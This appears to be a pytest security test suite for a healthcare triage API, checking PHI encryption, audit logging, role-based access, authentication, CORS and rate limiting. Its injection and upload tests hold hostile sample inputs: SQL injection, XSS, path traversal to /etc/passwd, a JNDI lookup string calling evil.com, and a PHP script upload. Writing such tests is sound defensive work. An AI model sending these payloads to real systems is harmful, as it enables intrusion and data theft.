"""
Security testing for Healthcare Triage System
Tests HIPAA compliance, authentication, authorization, and data protection
"""

import pytest
import requests
import json
import time
import hashlib
import base64
from datetime import datetime, timedelta
import psycopg2
import sqlparse
from unittest.mock import patch

# Security Test Configuration
API_BASE_URL = "http://localhost:5000/api"
SECURITY_DB_CONFIG = {
    "host": "localhost",
    "database": "healthcare_triage_security_test",
    "user": "security_test_user",
    "password": "security_test_password"
}

class TestHIPAACompliance:
    """Test HIPAA compliance requirements"""
    
    def setup_method(self):
        """Setup for each security test"""
        self.conn = psycopg2.connect(**SECURITY_DB_CONFIG)
        self.cursor = self.conn.cursor()
        
        # Clean test data
        self.cursor.execute("TRUNCATE TABLE patients, triage_sessions, audit_logs CASCADE")
        self.conn.commit()

    def teardown_method(self):
        """Cleanup after each test"""
        self.cursor.execute("TRUNCATE TABLE patients, triage_sessions, audit_logs CASCADE")
        self.conn.commit()
        self.cursor.close()
        self.conn.close()

    def test_phi_encryption_at_rest(self):
        """Test PHI (Protected Health Information) encryption in database"""
        
        # Create patient with sensitive data
        patient_data = {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "date_of_birth": "1980-01-15",
            "phone": "555-123-4567",
            "address": "123 Main St, City, State 12345",
            "insurance_id": "INS123456789"
        }
        
        headers = {"Authorization": "Bearer valid_test_token"}
        response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=headers)
        patient_id = response.json()["id"]
        
        # Check database storage - sensitive fields should be encrypted
        self.cursor.execute("SELECT ssn, date_of_birth, insurance_id FROM patients WHERE id = %s", (patient_id,))
        db_data = self.cursor.fetchone()
        
        # Verify encryption (encrypted data should not match plain text)
        assert db_data[0] != "123-45-6789"  # SSN should be encrypted
        assert db_data[1] != "1980-01-15"   # DOB should be encrypted
        assert db_data[2] != "INS123456789" # Insurance ID should be encrypted
        
        # Verify encrypted data is properly formatted (base64)
        for encrypted_field in db_data:
            if encrypted_field:
                try:
                    base64.b64decode(encrypted_field)
                    assert True  # Successfully decoded base64
                except:
                    pytest.fail(f"Encrypted field not properly base64 encoded: {encrypted_field}")

    def test_audit_logging_completeness(self):
        """Test comprehensive audit logging for all PHI access"""
        
        # Create patient
        patient_data = {"name": "Audit Test Patient", "age": 30}
        headers = {"Authorization": "Bearer test_token", "User-ID": "test_user_123"}
        
        response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=headers)
        patient_id = response.json()["id"]
        
        # Read patient data
        requests.get(f"{API_BASE_URL}/patients/{patient_id}", headers=headers)
        
        # Update patient data
        update_data = {"phone": "555-999-8888"}
        requests.put(f"{API_BASE_URL}/patients/{patient_id}", json=update_data, headers=headers)
        
        # Check audit logs
        self.cursor.execute(
            "SELECT action, resource_type, resource_id, user_id, timestamp, ip_address FROM audit_logs WHERE resource_id = %s ORDER BY timestamp",
            (patient_id,)
        )
        audit_entries = self.cursor.fetchall()
        
        # Should have CREATE, READ, UPDATE entries
        assert len(audit_entries) >= 3
        actions = [entry[0] for entry in audit_entries]
        assert "CREATE" in actions
        assert "READ" in actions
        assert "UPDATE" in actions
        
        # Verify audit entry completeness
        for entry in audit_entries:
            assert entry[1] == "patient"  # resource_type
            assert entry[2] == patient_id  # resource_id
            assert entry[3] == "test_user_123"  # user_id
            assert entry[4] is not None  # timestamp
            # IP address should be logged (entry[5])

    def test_data_minimization(self):
        """Test that only necessary PHI is collected and stored"""
        
        # Test patient creation with excessive data
        excessive_data = {
            "name": "Test Patient",
            "age": 30,
            "unnecessary_field": "should_be_rejected",
            "internal_notes": "should_not_be_stored",
            "admin_flag": True
        }
        
        headers = {"Authorization": "Bearer test_token"}
        response = requests.post(f"{API_BASE_URL}/patients", json=excessive_data, headers=headers)
        
        if response.status_code == 201:
            patient_id = response.json()["id"]
            
            # Verify unnecessary fields were not stored
            self.cursor.execute("SELECT * FROM patients WHERE id = %s", (patient_id,))
            patient_record = self.cursor.fetchone()
            
            # Convert to dict using cursor description
            columns = [desc[0] for desc in self.cursor.description]
            patient_dict = dict(zip(columns, patient_record))
            
            assert "unnecessary_field" not in patient_dict
            assert "internal_notes" not in patient_dict
            assert "admin_flag" not in patient_dict

    def test_access_controls_role_based(self):
        """Test role-based access controls for different user types"""
        
        # Create test patient
        patient_data = {"name": "Access Control Test", "age": 35}
        admin_headers = {"Authorization": "Bearer admin_token", "Role": "admin"}
        
        response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=admin_headers)
        patient_id = response.json()["id"]
        
        # Test different role access levels
        test_cases = [
            {"headers": {"Authorization": "Bearer nurse_token", "Role": "nurse"}, "should_access": True},
            {"headers": {"Authorization": "Bearer doctor_token", "Role": "doctor"}, "should_access": True},
            {"headers": {"Authorization": "Bearer admin_token", "Role": "admin"}, "should_access": True},
            {"headers": {"Authorization": "Bearer receptionist_token", "Role": "receptionist"}, "should_access": False},
            {"headers": {"Authorization": "Bearer janitor_token", "Role": "janitor"}, "should_access": False}
        ]
        
        for test_case in test_cases:
            response = requests.get(f"{API_BASE_URL}/patients/{patient_id}", headers=test_case["headers"])
            
            if test_case["should_access"]:
                assert response.status_code == 200, f"Role {test_case['headers'].get('Role')} should have access"
            else:
                assert response.status_code in [401, 403], f"Role {test_case['headers'].get('Role')} should not have access"

    def test_data_retention_policies(self):
        """Test automated data retention and deletion policies"""
        
        # Create old patient record (simulate old data)
        old_patient_data = {
            "name": "Old Patient Record",
            "age": 45,
            "created_date": (datetime.now() - timedelta(days=2555)).isoformat()  # ~7 years old
        }
        
        headers = {"Authorization": "Bearer admin_token"}
        response = requests.post(f"{API_BASE_URL}/patients", json=old_patient_data, headers=headers)
        patient_id = response.json()["id"]
        
        # Manually update created_date in database to simulate old record
        old_date = datetime.now() - timedelta(days=2555)
        self.cursor.execute("UPDATE patients SET created_at = %s WHERE id = %s", (old_date, patient_id))
        self.conn.commit()
        
        # Trigger retention policy check
        response = requests.post(f"{API_BASE_URL}/admin/data-retention/check", headers=headers)
        assert response.status_code == 200
        
        # Verify old record marked for deletion or archived
        self.cursor.execute("SELECT status, archived_at FROM patients WHERE id = %s", (patient_id,))
        patient_status = self.cursor.fetchone()
        
        assert patient_status[0] in ["ARCHIVED", "MARKED_FOR_DELETION"]
        assert patient_status[1] is not None  # archived_at should be set

class TestAuthentication:
    """Test authentication mechanisms"""
    
    def test_jwt_token_validation(self):
        """Test JWT token validation and expiration"""
        
        # Test with no token
        response = requests.get(f"{API_BASE_URL}/patients")
        assert response.status_code == 401
        
        # Test with invalid token
        headers = {"Authorization": "Bearer invalid_token_12345"}
        response = requests.get(f"{API_BASE_URL}/patients", headers=headers)
        assert response.status_code == 401
        
        # Test with expired token (mock)
        expired_headers = {"Authorization": "Bearer expired_test_token"}
        with patch('app.verify_token') as mock_verify:
            mock_verify.side_effect = Exception("Token expired")
            response = requests.get(f"{API_BASE_URL}/patients", headers=expired_headers)
            assert response.status_code == 401

    def test_multi_factor_authentication(self):
        """Test multi-factor authentication for sensitive operations"""
        
        # Attempt sensitive operation without MFA
        sensitive_data = {"role": "admin", "permissions": ["all"]}
        headers = {"Authorization": "Bearer valid_token"}
        
        response = requests.post(f"{API_BASE_URL}/admin/users", json=sensitive_data, headers=headers)
        assert response.status_code == 403  # Should require MFA
        
        # With MFA token
        mfa_headers = {
            "Authorization": "Bearer valid_token",
            "MFA-Token": "123456"  # Mock MFA token
        }
        
        with patch('app.verify_mfa_token') as mock_mfa:
            mock_mfa.return_value = True
            response = requests.post(f"{API_BASE_URL}/admin/users", json=sensitive_data, headers=mfa_headers)
            # Should now succeed (or at least not fail due to MFA)

    def test_session_management(self):
        """Test session timeout and concurrent session limits"""
        
        # Test session timeout
        headers = {"Authorization": "Bearer session_test_token"}
        
        # First request should work
        response = requests.get(f"{API_BASE_URL}/health", headers=headers)
        assert response.status_code == 200
        
        # Simulate session timeout
        with patch('app.check_session_timeout') as mock_timeout:
            mock_timeout.return_value = True  # Session timed out
            response = requests.get(f"{API_BASE_URL}/patients", headers=headers)
            assert response.status_code == 401

class TestDataProtection:
    """Test data protection and encryption"""
    
    def test_data_transmission_encryption(self):
        """Test that all API communications use HTTPS/TLS"""
        
        # This test would typically check SSL/TLS configuration
        # For local testing, we verify the server enforces HTTPS
        
        # Attempt HTTP request (should be redirected to HTTPS)
        try:
            response = requests.get("http://localhost:5000/api/health", allow_redirects=False)
            # Should get redirect to HTTPS or connection refused
            assert response.status_code in [301, 302, 404] or response.status_code >= 400
        except requests.exceptions.ConnectionError:
            # Connection refused is expected for HTTP-only servers
            pass

    def test_input_sanitization(self):
        """Test protection against injection attacks"""
        
        # SQL Injection attempts
        malicious_inputs = [
            "'; DROP TABLE patients; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        headers = {"Authorization": "Bearer test_token"}
        
        for malicious_input in malicious_inputs:
            # Test in patient name field
            patient_data = {"name": malicious_input, "age": 30}
            response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=headers)
            
            # Should either reject the input or safely sanitize it
            if response.status_code == 201:
                patient_id = response.json()["id"]
                
                # Verify the malicious input was sanitized
                response = requests.get(f"{API_BASE_URL}/patients/{patient_id}", headers=headers)
                stored_name = response.json()["name"]
                
                # Should not contain dangerous characters
                assert "<script>" not in stored_name
                assert "DROP TABLE" not in stored_name
                assert "../" not in stored_name

    def test_data_masking_for_display(self):
        """Test that sensitive data is masked in API responses"""
        
        # Create patient with sensitive data
        patient_data = {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "phone": "555-123-4567",
            "insurance_id": "INS123456789"
        }
        
        headers = {"Authorization": "Bearer nurse_token", "Role": "nurse"}
        response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=headers)
        patient_id = response.json()["id"]
        
        # Get patient data as nurse (limited access)
        response = requests.get(f"{API_BASE_URL}/patients/{patient_id}", headers=headers)
        patient_data = response.json()
        
        # Sensitive fields should be masked for nurses
        if "ssn" in patient_data:
            assert patient_data["ssn"] == "***-**-6789"  # Partial masking
        if "insurance_id" in patient_data:
            assert "***" in patient_data["insurance_id"]  # Should be partially masked

class TestVulnerabilityScanning:
    """Test common security vulnerabilities"""
    
    def test_rate_limiting_protection(self):
        """Test rate limiting to prevent abuse"""
        
        headers = {"Authorization": "Bearer test_token"}
        
        # Make rapid requests
        responses = []
        for i in range(25):  # Attempt 25 rapid requests
            response = requests.get(f"{API_BASE_URL}/health", headers=headers)
            responses.append(response.status_code)
            time.sleep(0.1)  # Small delay
        
        # Should eventually hit rate limit
        assert 429 in responses, "Rate limiting not working"

    def test_cors_configuration(self):
        """Test CORS configuration for security"""
        
        # Test preflight request
        headers = {
            "Origin": "https://malicious-site.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type, Authorization"
        }
        
        response = requests.options(f"{API_BASE_URL}/patients", headers=headers)
        
        # Should not allow arbitrary origins
        cors_origin = response.headers.get("Access-Control-Allow-Origin")
        assert cors_origin != "*", "CORS allows all origins - security risk"
        assert "malicious-site.com" not in str(cors_origin), "CORS allows malicious origin"

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        
        # Test error responses don't reveal system information
        response = requests.get(f"{API_BASE_URL}/nonexistent-endpoint")
        error_body = response.text.lower()
        
        # Should not reveal sensitive information in errors
        sensitive_keywords = [
            "stack trace", "database", "sql", "password", 
            "server version", "internal", "debug"
        ]
        
        for keyword in sensitive_keywords:
            assert keyword not in error_body, f"Error response reveals sensitive info: {keyword}"

    def test_file_upload_security(self):
        """Test file upload security if supported"""
        
        # Test malicious file upload attempts
        malicious_files = [
            ("test.php", b"<?php phpinfo(); ?>", "application/php"),
            ("test.jsp", b"<% out.println('test'); %>", "application/jsp"),
            ("test.exe", b"MZ\x90\x00\x03", "application/exe"),
            ("../../../etc/passwd", b"root:x:0:0:root", "text/plain")
        ]
        
        headers = {"Authorization": "Bearer test_token"}
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            
            # If file upload endpoint exists
            response = requests.post(f"{API_BASE_URL}/upload", files=files, headers=headers)
            
            # Should reject malicious files
            if response.status_code == 200:
                # If upload succeeds, verify file was properly validated
                result = response.json()
                assert "error" in result or "rejected" in result.get("status", "").lower()

class TestComplianceReporting:
    """Test compliance reporting and monitoring"""
    
    def test_security_monitoring_alerts(self):
        """Test security monitoring and alerting"""
        
        headers = {"Authorization": "Bearer test_token"}
        
        # Trigger suspicious activity
        suspicious_actions = [
            # Multiple failed login attempts
            {"endpoint": "/auth/login", "data": {"username": "admin", "password": "wrong"}},
            {"endpoint": "/auth/login", "data": {"username": "admin", "password": "wrong2"}},
            {"endpoint": "/auth/login", "data": {"username": "admin", "password": "wrong3"}},
            
            # Attempt to access many different patient records rapidly
            {"endpoint": "/patients/1", "data": None},
            {"endpoint": "/patients/2", "data": None},
            {"endpoint": "/patients/3", "data": None},
        ]
        
        for action in suspicious_actions:
            if action["data"]:
                requests.post(f"{API_BASE_URL}{action['endpoint']}", json=action["data"])
            else:
                requests.get(f"{API_BASE_URL}{action['endpoint']}", headers=headers)
        
        # Check if security alerts were generated
        response = requests.get(f"{API_BASE_URL}/admin/security-alerts", headers=headers)
        if response.status_code == 200:
            alerts = response.json()
            assert len(alerts) > 0, "Security monitoring should detect suspicious activity"

    def test_compliance_audit_trail(self):
        """Test complete audit trail for compliance reporting"""
        
        # Perform various operations
        headers = {"Authorization": "Bearer compliance_test_token", "User-ID": "compliance_user"}
        
        # Create patient
        patient_data = {"name": "Compliance Test", "age": 30}
        response = requests.post(f"{API_BASE_URL}/patients", json=patient_data, headers=headers)
        patient_id = response.json()["id"]
        
        # Access patient record
        requests.get(f"{API_BASE_URL}/patients/{patient_id}", headers=headers)
        
        # Generate compliance report
        report_request = {
            "start_date": (datetime.now() - timedelta(days=1)).isoformat(),
            "end_date": datetime.now().isoformat(),
            "include_phi_access": True
        }
        
        response = requests.post(f"{API_BASE_URL}/admin/compliance-report", 
                               json=report_request, headers=headers)
        
        if response.status_code == 200:
            report = response.json()
            assert "phi_access_events" in report
            assert "user_activities" in report
            assert "security_events" in report

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])